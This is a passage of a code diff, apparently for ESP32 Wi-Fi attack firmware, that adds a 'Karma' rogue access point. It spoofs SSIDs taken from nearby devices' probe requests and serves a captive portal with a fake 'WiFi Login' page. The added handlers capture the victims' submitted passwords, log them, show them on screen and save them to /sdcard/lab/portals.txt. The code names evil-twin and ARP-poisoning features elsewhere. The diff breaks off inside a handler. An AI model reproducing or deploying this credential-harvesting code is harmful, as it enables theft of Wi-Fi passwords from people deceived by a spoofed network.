@@ -8,6 +8,7 @@
 #include <string.h>
 #include <stdlib.h>
 #include <ctype.h>
+#include <errno.h>
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
 #include "freertos/timers.h"
@@ -25,6 +26,13 @@
 #include "esp_wifi.h"
 #include "esp_netif.h"
 #include "esp_event.h"
+
+// Captive portal includes
+#include "esp_http_server.h"
+#include "lwip/sockets.h"
+#include "lwip/netdb.h"
+#include <dirent.h>
+#include <sys/stat.h>
 
 // Audio codec for startup beep (commented out - causes linker issues)
 // #include "esp_codec_dev.h"
@@ -351,6 +359,67 @@ static int karma_probe_count = 0;
 static char karma_html_files[20][64];
 static int karma_html_count = 0;
 
+// ============================================================================
+// Captive Portal (for Probes & Karma on Network Observer)
+// ============================================================================
+#define DNS_MAX_PACKET_SIZE 512
+#define PORTAL_HTML_MAX_SIZE 32768
+
+static httpd_handle_t portal_server = NULL;
+static bool portal_active = false;
+static char *portal_ssid = NULL;
+static char *custom_portal_html = NULL;
+static int dns_server_socket = -1;
+static TaskHandle_t dns_server_task_handle = NULL;
+static esp_netif_t *ap_netif = NULL;
+
+// Probes & Karma popup elements
+static lv_obj_t *karma2_probes_popup_overlay = NULL;
+static lv_obj_t *karma2_probes_popup_obj = NULL;
+static lv_obj_t *karma2_html_popup_overlay = NULL;
+static lv_obj_t *karma2_html_popup_obj = NULL;
+static lv_obj_t *karma2_html_dropdown = NULL;
+static lv_obj_t *karma2_attack_popup_overlay = NULL;
+static lv_obj_t *karma2_attack_popup_obj = NULL;
+static lv_obj_t *karma2_attack_status_label = NULL;
+
+// Probes storage (from UART)
+#define KARMA2_MAX_PROBES 64
+static char karma2_probes[KARMA2_MAX_PROBES][33];
+static int karma2_probe_count = 0;
+static int karma2_selected_probe_idx = -1;
+
+// HTML files for captive portal
+#define KARMA2_MAX_HTML_FILES 20
+static char karma2_html_files[KARMA2_MAX_HTML_FILES][64];
+static int karma2_html_count = 0;
+
+// Default portal HTML (fallback)
+static const char *default_portal_html = 
+    "<!DOCTYPE html><html><head>"
+    "<meta charset='UTF-8'>"
+    "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+    "<title>WiFi Login</title>"
+    "<style>"
+    "body { font-family: Arial, sans-serif; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); margin: 0; padding: 20px; min-height: 100vh; }"
+    ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 40px rgba(0,0,0,0.3); }"
+    "h1 { text-align: center; color: #333; margin-bottom: 30px; }"
+    "input { width: 100%; padding: 15px; margin: 10px 0; border: 2px solid #ddd; border-radius: 8px; box-sizing: border-box; font-size: 16px; }"
+    "input:focus { border-color: #667eea; outline: none; }"
+    "button { width: 100%; padding: 15px; background: linear-gradient(135deg, #667eea 0%, #764ba2 100%); color: white; border: none; border-radius: 8px; font-size: 18px; cursor: pointer; margin-top: 20px; }"
+    "button:hover { opacity: 0.9; }"
+    "</style>"
+    "</head>"
+    "<body>"
+    "<div class='container'>"
+    "<h1>WiFi Login</h1>"
+    "<form action='/login' method='POST'>"
+    "<input type='password' name='password' placeholder='Enter WiFi Password' required>"
+    "<button type='submit'>Connect</button>"
+    "</form>"
+    "</div>"
+    "</body></html>";
+
 // Deauth Detector
 #define DEAUTH_DETECTOR_MAX_ENTRIES 200
 typedef struct {
@@ -458,6 +527,32 @@ static void karma_html_popup_close_cb(lv_event_t *e);
 static void karma_html_select_cb(lv_event_t *e);
 static void karma_attack_popup_close_cb(lv_event_t *e);
 static void karma_monitor_task(void *arg);
+
+// Captive Portal (Probes & Karma on Network Observer)
+static void observer_karma_btn_cb(lv_event_t *e);
+static void karma2_fetch_probes(void);
+static void karma2_probe_click_cb(lv_event_t *e);
+static void karma2_probes_popup_close_cb(lv_event_t *e);
+static void show_karma2_html_popup(void);
+static void karma2_html_popup_close_cb(lv_event_t *e);
+static void karma2_html_select_cb(lv_event_t *e);
+static void karma2_fetch_html_files(void);
+static esp_err_t start_captive_portal(const char *ssid);
+static void stop_captive_portal(void);
+static void dns_server_task(void *pvParameters);
+static esp_err_t portal_root_handler(httpd_req_t *req);
+static esp_err_t portal_page_handler(httpd_req_t *req);
+static esp_err_t portal_login_handler(httpd_req_t *req);
+static esp_err_t portal_get_handler(httpd_req_t *req);
+static esp_err_t portal_save_handler(httpd_req_t *req);
+static esp_err_t android_captive_handler(httpd_req_t *req);
+static esp_err_t ios_captive_handler(httpd_req_t *req);
+static esp_err_t captive_detection_handler(httpd_req_t *req);
+static esp_err_t captive_portal_redirect_handler(httpd_req_t *req);
+static void show_karma2_attack_popup(const char *ssid);
+static void karma2_attack_stop_cb(lv_event_t *e);
+static void save_portal_data(const char *ssid, const char *form_data);
+
 static void show_scan_overlay(void);
 static void hide_scan_overlay(void);
 static void show_evil_twin_loading_overlay(void);
@@ -5402,6 +5497,21 @@ static void show_observer_page(void)
     lv_obj_set_style_text_color(start_label, lv_color_hex(0xFFFFFF), 0);
     lv_obj_center(start_label);
     
+    // Probes & Karma button (orange) - positioned left of start button
+    lv_obj_t *karma_btn = lv_btn_create(header);
+    lv_obj_set_size(karma_btn, 120, 40);
+    lv_obj_align_to(karma_btn, observer_start_btn, LV_ALIGN_OUT_LEFT_MID, -12, 0);
+    lv_obj_set_style_bg_color(karma_btn, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_bg_color(karma_btn, lv_color_lighten(COLOR_MATERIAL_ORANGE, 30), LV_STATE_PRESSED);
+    lv_obj_set_style_radius(karma_btn, 8, 0);
+    lv_obj_add_event_cb(karma_btn, observer_karma_btn_cb, LV_EVENT_CLICKED, NULL);
+    
+    lv_obj_t *karma_label = lv_label_create(karma_btn);
+    lv_label_set_text(karma_label, LV_SYMBOL_WIFI " Karma");
+    lv_obj_set_style_text_font(karma_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(karma_label, lv_color_hex(0x000000), 0);
+    lv_obj_center(karma_label);
+    
     // Status label
     observer_status_label = lv_label_create(observer_page);
     lv_label_set_text(observer_status_label, "Press Start to begin observing");
@@ -7684,6 +7794,1097 @@ static void evil_twin_connect_popup_yes_cb(lv_event_t *e)
     
     // Show ARP Poison page (will auto-connect and scan)
     show_arp_poison_page();
+}
+
+//==================================================================================
+// Captive Portal for Probes & Karma (Network Observer)
+//==================================================================================
+
+// Observer Karma button callback - fetch probes and show popup
+static void observer_karma_btn_cb(lv_event_t *e)
+{
+    (void)e;
+    ESP_LOGI(TAG, "Probes & Karma button clicked");
+    karma2_fetch_probes();
+}
+
+// Fetch probes from UART and show popup
+static void karma2_fetch_probes(void)
+{
+    ESP_LOGI(TAG, "Fetching probes from UART...");
+    
+    // Determine which UART to use
+    uart_port_t uart_port = (hw_config == 1) ? UART2_NUM : UART_NUM;
+    
+    // Flush UART buffer
+    uart_flush(uart_port);
+    
+    // Send list_probes command
+    if (hw_config == 1) {
+        uart2_send_command("list_probes");
+    } else {
+        uart_send_command("list_probes");
+    }
+    
+    // Wait for response
+    static char rx_buffer[2048];
+    int total_len = 0;
+    int retries = 10;
+    
+    vTaskDelay(pdMS_TO_TICKS(300));
+    
+    while (retries-- > 0) {
+        int len = uart_read_bytes(uart_port, (uint8_t*)rx_buffer + total_len, sizeof(rx_buffer) - total_len - 1, pdMS_TO_TICKS(200));
+        if (len > 0) {
+            total_len += len;
+        }
+        if (len <= 0 && total_len > 0) break;
+    }
+    rx_buffer[total_len] = '\0';
+    
+    ESP_LOGI(TAG, "list_probes response (%d bytes): %s", total_len, rx_buffer);
+    
+    // Parse response - format: "N SSID_Name"
+    karma2_probe_count = 0;
+    memset(karma2_probes, 0, sizeof(karma2_probes));
+    
+    char *line = strtok(rx_buffer, "\n\r");
+    while (line != NULL && karma2_probe_count < KARMA2_MAX_PROBES) {
+        // Skip empty lines and info messages
+        if (strlen(line) < 3 || strstr(line, "No probe") != NULL || strstr(line, "list_probes") != NULL) {
+            line = strtok(NULL, "\n\r");
+            continue;
+        }
+        
+        // Parse "N SSID" format
+        int idx;
+        char ssid[33] = {0};
+        if (sscanf(line, "%d %32[^\n\r]", &idx, ssid) >= 2 && strlen(ssid) > 0) {
+            // Trim whitespace
+            char *start = ssid;
+            while (*start == ' ') start++;
+            char *end = start + strlen(start) - 1;
+            while (end > start && (*end == ' ' || *end == '\n' || *end == '\r')) *end-- = '\0';
+            
+            if (strlen(start) > 0) {
+                snprintf(karma2_probes[karma2_probe_count], sizeof(karma2_probes[0]), "%s", start);
+                ESP_LOGI(TAG, "Probe %d: %s", karma2_probe_count + 1, karma2_probes[karma2_probe_count]);
+                karma2_probe_count++;
+            }
+        }
+        
+        line = strtok(NULL, "\n\r");
+    }
+    
+    ESP_LOGI(TAG, "Found %d probes", karma2_probe_count);
+    
+    // Show popup with probes list
+    lv_obj_t *scr = lv_scr_act();
+    
+    karma2_probes_popup_overlay = lv_obj_create(scr);
+    lv_obj_remove_style_all(karma2_probes_popup_overlay);
+    lv_obj_set_size(karma2_probes_popup_overlay, lv_pct(100), lv_pct(100));
+    lv_obj_set_style_bg_color(karma2_probes_popup_overlay, lv_color_hex(0x000000), 0);
+    lv_obj_set_style_bg_opa(karma2_probes_popup_overlay, LV_OPA_70, 0);
+    lv_obj_clear_flag(karma2_probes_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
+    
+    karma2_probes_popup_obj = lv_obj_create(karma2_probes_popup_overlay);
+    lv_obj_set_size(karma2_probes_popup_obj, 400, 450);
+    lv_obj_center(karma2_probes_popup_obj);
+    lv_obj_set_style_bg_color(karma2_probes_popup_obj, lv_color_hex(0x2A2A2A), 0);
+    lv_obj_set_style_border_color(karma2_probes_popup_obj, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_border_width(karma2_probes_popup_obj, 2, 0);
+    lv_obj_set_style_radius(karma2_probes_popup_obj, 12, 0);
+    lv_obj_set_style_pad_all(karma2_probes_popup_obj, 15, 0);
+    lv_obj_set_flex_flow(karma2_probes_popup_obj, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_row(karma2_probes_popup_obj, 10, 0);
+    
+    // Title
+    lv_obj_t *title = lv_label_create(karma2_probes_popup_obj);
+    lv_label_set_text(title, LV_SYMBOL_WIFI " Probes & Karma");
+    lv_obj_set_style_text_font(title, &lv_font_montserrat_20, 0);
+    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
+    
+    // Subtitle
+    lv_obj_t *subtitle = lv_label_create(karma2_probes_popup_obj);
+    lv_label_set_text_fmt(subtitle, "Found %d probe requests - tap to start portal", karma2_probe_count);
+    lv_obj_set_style_text_font(subtitle, &lv_font_montserrat_12, 0);
+    lv_obj_set_style_text_color(subtitle, lv_color_hex(0x888888), 0);
+    
+    // Scrollable list container
+    lv_obj_t *list_container = lv_obj_create(karma2_probes_popup_obj);
+    lv_obj_set_size(list_container, lv_pct(100), 300);
+    lv_obj_set_flex_grow(list_container, 1);
+    lv_obj_set_style_bg_color(list_container, lv_color_hex(0x1A1A1A), 0);
+    lv_obj_set_style_border_width(list_container, 0, 0);
+    lv_obj_set_style_radius(list_container, 8, 0);
+    lv_obj_set_style_pad_all(list_container, 8, 0);
+    lv_obj_set_flex_flow(list_container, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_style_pad_row(list_container, 6, 0);
+    
+    if (karma2_probe_count == 0) {
+        lv_obj_t *no_probes = lv_label_create(list_container);
+        lv_label_set_text(no_probes, "No probes found.\nMake sure sniffer is running.");
+        lv_obj_set_style_text_font(no_probes, &lv_font_montserrat_14, 0);
+        lv_obj_set_style_text_color(no_probes, lv_color_hex(0x888888), 0);
+    } else {
+        for (int i = 0; i < karma2_probe_count; i++) {
+            lv_obj_t *row = lv_obj_create(list_container);
+            lv_obj_set_size(row, lv_pct(100), LV_SIZE_CONTENT);
+            lv_obj_set_style_bg_color(row, lv_color_hex(0x2D2D2D), 0);
+            lv_obj_set_style_bg_color(row, lv_color_hex(0x3D3D3D), LV_STATE_PRESSED);
+            lv_obj_set_style_border_width(row, 0, 0);
+            lv_obj_set_style_radius(row, 6, 0);
+            lv_obj_set_style_pad_all(row, 10, 0);
+            lv_obj_clear_flag(row, LV_OBJ_FLAG_SCROLLABLE);
+            lv_obj_add_flag(row, LV_OBJ_FLAG_CLICKABLE);
+            lv_obj_add_event_cb(row, karma2_probe_click_cb, LV_EVENT_CLICKED, (void*)(intptr_t)i);
+            
+            lv_obj_t *ssid_label = lv_label_create(row);
+            lv_label_set_text_fmt(ssid_label, "%d. %s", i + 1, karma2_probes[i]);
+            lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_16, 0);
+            lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xFFFFFF), 0);
+        }
+    }
+    
+    // Close button
+    lv_obj_t *close_btn = lv_btn_create(karma2_probes_popup_obj);
+    lv_obj_set_size(close_btn, 120, 40);
+    lv_obj_set_style_bg_color(close_btn, lv_color_hex(0x444444), 0);
+    lv_obj_set_style_radius(close_btn, 8, 0);
+    lv_obj_add_event_cb(close_btn, karma2_probes_popup_close_cb, LV_EVENT_CLICKED, NULL);
+    
+    lv_obj_t *close_label = lv_label_create(close_btn);
+    lv_label_set_text(close_label, "Close");
+    lv_obj_set_style_text_font(close_label, &lv_font_montserrat_14, 0);
+    lv_obj_center(close_label);
+}
+
+// Probe click callback
+static void karma2_probe_click_cb(lv_event_t *e)
+{
+    karma2_selected_probe_idx = (int)(intptr_t)lv_event_get_user_data(e);
+    
+    if (karma2_selected_probe_idx < 0 || karma2_selected_probe_idx >= karma2_probe_count) {
+        ESP_LOGW(TAG, "Invalid probe index: %d", karma2_selected_probe_idx);
+        return;
+    }
+    
+    ESP_LOGI(TAG, "Selected probe: %s", karma2_probes[karma2_selected_probe_idx]);
+    
+    // Close probes popup
+    if (karma2_probes_popup_overlay) {
+        lv_obj_del(karma2_probes_popup_overlay);
+        karma2_probes_popup_overlay = NULL;
+        karma2_probes_popup_obj = NULL;
+    }
+    
+    // Show HTML selection popup
+    show_karma2_html_popup();
+}
+
+// Close probes popup
+static void karma2_probes_popup_close_cb(lv_event_t *e)
+{
+    (void)e;
+    if (karma2_probes_popup_overlay) {
+        lv_obj_del(karma2_probes_popup_overlay);
+        karma2_probes_popup_overlay = NULL;
+        karma2_probes_popup_obj = NULL;
+    }
+}
+
+// Fetch HTML files from SD card
+static void karma2_fetch_html_files(void)
+{
+    karma2_html_count = 0;
+    memset(karma2_html_files, 0, sizeof(karma2_html_files));
+    
+    const char *html_path = "/sdcard/lab/htmls";
+    ESP_LOGI(TAG, "Opening HTML directory: %s", html_path);
+    
+    // Check if directory exists
+    struct stat st;
+    if (stat(html_path, &st) != 0) {
+        ESP_LOGW(TAG, "Directory does not exist: %s (errno=%d)", html_path, errno);
+        return;
+    }
+    
+    if (!S_ISDIR(st.st_mode)) {
+        ESP_LOGW(TAG, "Path is not a directory: %s", html_path);
+        return;
+    }
+    
+    DIR *dir = opendir(html_path);
+    if (dir == NULL) {
+        ESP_LOGW(TAG, "Cannot open directory: %s (errno=%d)", html_path, errno);
+        return;
+    }
+    
+    ESP_LOGI(TAG, "Directory opened successfully, listing contents:");
+    
+    struct dirent *entry;
+    int total_entries = 0;
+    while ((entry = readdir(dir)) != NULL) {
+        total_entries++;
+        
+        // Log every entry for debugging
+        const char *type_str = "UNKNOWN";
+        switch (entry->d_type) {
+            case DT_REG: type_str = "FILE"; break;
+            case DT_DIR: type_str = "DIR"; break;
+            case DT_LNK: type_str = "LINK"; break;
+            case DT_UNKNOWN: type_str = "UNKNOWN"; break;
+        }
+        ESP_LOGI(TAG, "  [%s] %s", type_str, entry->d_name);
+        
+        // Check for HTML files (accept DT_REG or DT_UNKNOWN for FAT compatibility)
+        if (entry->d_type == DT_REG || entry->d_type == DT_UNKNOWN) {
+            const char *ext = strrchr(entry->d_name, '.');
+            if (ext) {
+                ESP_LOGI(TAG, "    Extension: %s", ext);
+                if (strcasecmp(ext, ".html") == 0 || strcasecmp(ext, ".htm") == 0) {
+                    if (karma2_html_count < KARMA2_MAX_HTML_FILES) {
+                        size_t name_len = strlen(entry->d_name);
+                        size_t max_len = sizeof(karma2_html_files[0]) - 1;
+                        if (name_len > max_len) name_len = max_len;
+                        memcpy(karma2_html_files[karma2_html_count], entry->d_name, name_len);
+                        karma2_html_files[karma2_html_count][name_len] = '\0';
+                        ESP_LOGI(TAG, "    -> Added as HTML file #%d: %s", karma2_html_count + 1, karma2_html_files[karma2_html_count]);
+                        karma2_html_count++;
+                    }
+                }
+            }
+        }
+    }
+    closedir(dir);
+    
+    ESP_LOGI(TAG, "Directory scan complete: %d total entries, %d HTML files found", total_entries, karma2_html_count);
+}
+
+// Show HTML selection popup
+static void show_karma2_html_popup(void)
+{
+    // Fetch HTML files first
+    karma2_fetch_html_files();
+    
+    lv_obj_t *scr = lv_scr_act();
+    
+    karma2_html_popup_overlay = lv_obj_create(scr);
+    lv_obj_remove_style_all(karma2_html_popup_overlay);
+    lv_obj_set_size(karma2_html_popup_overlay, lv_pct(100), lv_pct(100));
+    lv_obj_set_style_bg_color(karma2_html_popup_overlay, lv_color_hex(0x000000), 0);
+    lv_obj_set_style_bg_opa(karma2_html_popup_overlay, LV_OPA_70, 0);
+    lv_obj_clear_flag(karma2_html_popup_overlay, LV_OBJ_FLAG_SCROLLABLE);
+    
+    karma2_html_popup_obj = lv_obj_create(karma2_html_popup_overlay);
+    lv_obj_set_size(karma2_html_popup_obj, 350, LV_SIZE_CONTENT);
+    lv_obj_center(karma2_html_popup_obj);
+    lv_obj_set_style_bg_color(karma2_html_popup_obj, lv_color_hex(0x2A2A2A), 0);
+    lv_obj_set_style_border_color(karma2_html_popup_obj, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_border_width(karma2_html_popup_obj, 2, 0);
+    lv_obj_set_style_radius(karma2_html_popup_obj, 12, 0);
+    lv_obj_set_style_pad_all(karma2_html_popup_obj, 20, 0);
+    lv_obj_set_flex_flow(karma2_html_popup_obj, LV_FLEX_FLOW_COLUMN);
+    lv_obj_set_flex_align(karma2_html_popup_obj, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_row(karma2_html_popup_obj, 15, 0);
+    lv_obj_clear_flag(karma2_html_popup_obj, LV_OBJ_FLAG_SCROLLABLE);
+    
+    // Title
+    lv_obj_t *title = lv_label_create(karma2_html_popup_obj);
+    lv_label_set_text(title, "Select Portal HTML");
+    lv_obj_set_style_text_font(title, &lv_font_montserrat_18, 0);
+    lv_obj_set_style_text_color(title, COLOR_MATERIAL_ORANGE, 0);
+    
+    // SSID info
+    lv_obj_t *ssid_label = lv_label_create(karma2_html_popup_obj);
+    lv_label_set_text_fmt(ssid_label, "SSID: %s", karma2_probes[karma2_selected_probe_idx]);
+    lv_obj_set_style_text_font(ssid_label, &lv_font_montserrat_14, 0);
+    lv_obj_set_style_text_color(ssid_label, lv_color_hex(0xCCCCCC), 0);
+    
+    // Dropdown for HTML files
+    karma2_html_dropdown = lv_dropdown_create(karma2_html_popup_obj);
+    lv_obj_set_width(karma2_html_dropdown, lv_pct(100));
+    lv_obj_set_style_bg_color(karma2_html_dropdown, lv_color_hex(0x1A1A1A), 0);
+    lv_obj_set_style_border_color(karma2_html_dropdown, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_text_color(karma2_html_dropdown, lv_color_hex(0xFFFFFF), 0);
+    
+    if (karma2_html_count > 0) {
+        char options[2048] = {0};
+        for (int i = 0; i < karma2_html_count; i++) {
+            if (i > 0) strcat(options, "\n");
+            strcat(options, karma2_html_files[i]);
+        }
+        lv_dropdown_set_options(karma2_html_dropdown, options);
+    } else {
+        lv_dropdown_set_options(karma2_html_dropdown, "(Default portal)");
+    }
+    
+    // Button row
+    lv_obj_t *btn_row = lv_obj_create(karma2_html_popup_obj);
+    lv_obj_set_size(btn_row, lv_pct(100), LV_SIZE_CONTENT);
+    lv_obj_set_style_bg_opa(btn_row, LV_OPA_TRANSP, 0);
+    lv_obj_set_style_border_width(btn_row, 0, 0);
+    lv_obj_set_style_pad_all(btn_row, 0, 0);
+    lv_obj_set_flex_flow(btn_row, LV_FLEX_FLOW_ROW);
+    lv_obj_set_flex_align(btn_row, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER, LV_FLEX_ALIGN_CENTER);
+    lv_obj_set_style_pad_column(btn_row, 20, 0);
+    lv_obj_clear_flag(btn_row, LV_OBJ_FLAG_SCROLLABLE);
+    
+    // Cancel button
+    lv_obj_t *cancel_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(cancel_btn, 100, 40);
+    lv_obj_set_style_bg_color(cancel_btn, lv_color_hex(0x444444), 0);
+    lv_obj_set_style_radius(cancel_btn, 8, 0);
+    lv_obj_add_event_cb(cancel_btn, karma2_html_popup_close_cb, LV_EVENT_CLICKED, NULL);
+    
+    lv_obj_t *cancel_label = lv_label_create(cancel_btn);
+    lv_label_set_text(cancel_label, "Cancel");
+    lv_obj_center(cancel_label);
+    
+    // Start button
+    lv_obj_t *start_btn = lv_btn_create(btn_row);
+    lv_obj_set_size(start_btn, 130, 40);
+    lv_obj_set_style_bg_color(start_btn, COLOR_MATERIAL_ORANGE, 0);
+    lv_obj_set_style_radius(start_btn, 8, 0);
+    lv_obj_add_event_cb(start_btn, karma2_html_select_cb, LV_EVENT_CLICKED, NULL);
+    
+    lv_obj_t *start_label = lv_label_create(start_btn);
+    lv_label_set_text(start_label, "Start Portal");
+    lv_obj_set_style_text_color(start_label, lv_color_hex(0x000000), 0);
+    lv_obj_center(start_label);
+}
+
+// HTML popup close callback
+static void karma2_html_popup_close_cb(lv_event_t *e)
+{
+    (void)e;
+    if (karma2_html_popup_overlay) {
+        lv_obj_del(karma2_html_popup_overlay);
+        karma2_html_popup_overlay = NULL;
+        karma2_html_popup_obj = NULL;
+        karma2_html_dropdown = NULL;
+    }
+}
+
+// HTML select callback - start captive portal
+static void karma2_html_select_cb(lv_event_t *e)
+{
+    (void)e;
+    
+    if (!karma2_html_dropdown || karma2_selected_probe_idx < 0) return;
+    
+    // Load selected HTML file
+    if (custom_portal_html) {
+        free(custom_portal_html);
+        custom_portal_html = NULL;
+    }
+    
+    int html_idx = lv_dropdown_get_selected(karma2_html_dropdown);
+    
+    if (karma2_html_count > 0 && html_idx < karma2_html_count) {
+        char filepath[128];
+        snprintf(filepath, sizeof(filepath), "/sdcard/lab/htmls/%s", karma2_html_files[html_idx]);
+        
+        FILE *f = fopen(filepath, "r");
+        if (f) {
+            fseek(f, 0, SEEK_END);
+            long size = ftell(f);
+            fseek(f, 0, SEEK_SET);
+            
+            if (size > 0 && size < PORTAL_HTML_MAX_SIZE) {
+                custom_portal_html = malloc(size + 1);
+                if (custom_portal_html) {
+                    fread(custom_portal_html, 1, size, f);
+                    custom_portal_html[size] = '\0';
+                    ESP_LOGI(TAG, "Loaded HTML file: %s (%ld bytes)", filepath, size);
+                }
+            }
+            fclose(f);
+        } else {
+            ESP_LOGW(TAG, "Cannot open HTML file: %s", filepath);
+        }
+    }
+    
+    // Close HTML popup
+    if (karma2_html_popup_overlay) {
+        lv_obj_del(karma2_html_popup_overlay);
+        karma2_html_popup_overlay = NULL;
+        karma2_html_popup_obj = NULL;
+        karma2_html_dropdown = NULL;
+    }
+    
+    // Get selected SSID
+    const char *ssid = karma2_probes[karma2_selected_probe_idx];
+    
+    ESP_LOGI(TAG, "Starting captive portal with SSID: %s", ssid);
+    
+    // Start captive portal
+    esp_err_t ret = start_captive_portal(ssid);
+    if (ret == ESP_OK) {
+        show_karma2_attack_popup(ssid);
+    } else {
+        ESP_LOGE(TAG, "Failed to start captive portal");
+    }
+}
+
+// Save portal data to file
+static void save_portal_data(const char *ssid, const char *form_data)
+{
+    if (!ssid || !form_data) return;
+    
+    FILE *f = fopen("/sdcard/lab/portals.txt", "a");
+    if (f) {
+        fprintf(f, "SSID: %s\nData: %s\n---\n", ssid, form_data);
+        fclose(f);
+        ESP_LOGI(TAG, "Portal data saved for SSID: %s", ssid);
+    } else {
+        ESP_LOGW(TAG, "Cannot open portals.txt for writing");
+    }
+}
+
+// ============================================================================
+// HTTP Handlers for Captive Portal
+// ============================================================================
+
+// Root handler - returns portal HTML
+static esp_err_t portal_root_handler(httpd_req_t *req)
+{
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Pragma", "no-cache");
+    httpd_resp_set_hdr(req, "Expires", "0");
+    httpd_resp_set_hdr(req, "Connection", "close");
+    httpd_resp_set_type(req, "text/html; charset=utf-8");
+    
+    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Portal page handler
+static esp_err_t portal_page_handler(httpd_req_t *req)
+{
+    httpd_resp_set_type(req, "text/html");
+    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
+    httpd_resp_send(req, html, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Login handler - POST with password
+static esp_err_t portal_login_handler(httpd_req_t *req)
+{
+    char buf[512];
+    int ret = httpd_req_recv(req, buf, sizeof(buf) - 1);
+    if (ret <= 0) {
+        return ESP_FAIL;
+    }
+    buf[ret] = '\0';
+    
+    ESP_LOGI(TAG, "Portal received POST data: %s", buf);
+    
+    // Parse password
+    char *password_start = strstr(buf, "password=");
+    if (password_start) {
+        password_start += 9;
+        char *password_end = strchr(password_start, '&');
+        if (password_end) *password_end = '\0';
+        
+        // URL decode
+        char decoded[64];
+        int decoded_len = 0;
+        for (char *p = password_start; *p && decoded_len < (int)sizeof(decoded) - 1; p++) {
+            if (*p == '%' && p[1] && p[2]) {
+                char hex[3] = {p[1], p[2], '\0'};
+                decoded[decoded_len++] = (char)strtol(hex, NULL, 16);
+                p += 2;
+            } else if (*p == '+') {
+                decoded[decoded_len++] = ' ';
+            } else {
+                decoded[decoded_len++] = *p;
+            }
+        }
+        decoded[decoded_len] = '\0';
+        
+        ESP_LOGI(TAG, "Password: %s", decoded);
+        
+        // Save to file
+        save_portal_data(portal_ssid, buf);
+        
+        // Update UI if attack popup is visible
+        if (karma2_attack_status_label) {
+            bsp_display_lock(0);
+            lv_label_set_text_fmt(karma2_attack_status_label, 
+                "Portal: %s\n\nPassword received: %s\n\nData saved to portals.txt", 
+                portal_ssid, decoded);
+            lv_obj_set_style_text_color(karma2_attack_status_label, COLOR_MATERIAL_GREEN, 0);
+            bsp_display_unlock();
+        }
+    }
+    
+    // Response
+    const char *response = 
+        "<!DOCTYPE html><html><head>"
+        "<meta charset='UTF-8'>"
+        "<meta name='viewport' content='width=device-width, initial-scale=1.0'>"
+        "<title>Connected</title>"
+        "<style>"
+        "body { font-family: Arial, sans-serif; background: #f0f0f0; margin: 0; padding: 20px; }"
+        ".container { max-width: 400px; margin: 50px auto; background: white; padding: 30px; border-radius: 10px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }"
+        "h1 { text-align: center; color: #4CAF50; }"
+        "p { text-align: center; color: #666; }"
+        "</style>"
+        "</head>"
+        "<body>"
+        "<div class='container'>"
+        "<h1>Connected!</h1>"
+        "<p>You are now connected to the network.</p>"
+        "</div>"
+        "</body></html>";
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// GET handler for password via query string
+static esp_err_t portal_get_handler(httpd_req_t *req)
+{
+    size_t query_len = httpd_req_get_url_query_len(req);
+    if (query_len > 0) {
+        char *query = malloc(query_len + 1);
+        if (query && httpd_req_get_url_query_str(req, query, query_len + 1) == ESP_OK) {
+            ESP_LOGI(TAG, "Portal GET query: %s", query);
+            
+            char password[64];
+            if (httpd_query_key_value(query, "password", password, sizeof(password)) == ESP_OK) {
+                // URL decode
+                char decoded[64];
+                int decoded_len = 0;
+                for (char *p = password; *p && decoded_len < (int)sizeof(decoded) - 1; p++) {
+                    if (*p == '%' && p[1] && p[2]) {
+                        char hex[3] = {p[1], p[2], '\0'};
+                        decoded[decoded_len++] = (char)strtol(hex, NULL, 16);
+                        p += 2;
+                    } else if (*p == '+') {
+                        decoded[decoded_len++] = ' ';
+                    } else {
+                        decoded[decoded_len++] = *p;
+                    }
+                }
+                decoded[decoded_len] = '\0';
+                
+                ESP_LOGI(TAG, "Password: %s", decoded);
+                save_portal_data(portal_ssid, query);
+                
+                // Update UI
+                if (karma2_attack_status_label) {
+                    bsp_display_lock(0);
+                    lv_label_set_text_fmt(karma2_attack_status_label, 
+                        "Portal: %s\n\nPassword received: %s\n\nData saved to portals.txt", 
+                        portal_ssid, decoded);
+                    lv_obj_set_style_text_color(karma2_attack_status_label, COLOR_MATERIAL_GREEN, 0);
+                    bsp_display_unlock();
+                }
+            }
+            free(query);
+        }
+    }
+    
+    // Response
+    const char *response = 
+        "<!DOCTYPE html><html><head><meta charset='UTF-8'>"
+        "<title>Connected</title></head><body>"
+        "<h1>Connected!</h1><p>You are now connected.</p>"
+        "</body></html>";
+    
+    httpd_resp_send(req, response, HTTPD_RESP_USE_STRLEN);
+    return ESP_OK;
+}
+
+// Save handler
+static esp_err_t portal_save_handler(httpd_req_t *req)
+{
+    return portal_login_handler(req);
+}
+
+// Android captive portal detection
+static esp_err_t android_captive_handler(httpd_req_t *req)
+{
+    httpd_resp_set_status(req, "200 OK");
+    httpd_resp_set_hdr(req, "Cache-Control", "no-cache, no-store, must-revalidate");
+    httpd_resp_set_hdr(req, "Content-Type", "text/html");
+    
+    const char *html = custom_portal_html ? custom_portal_html : default_portal_html;
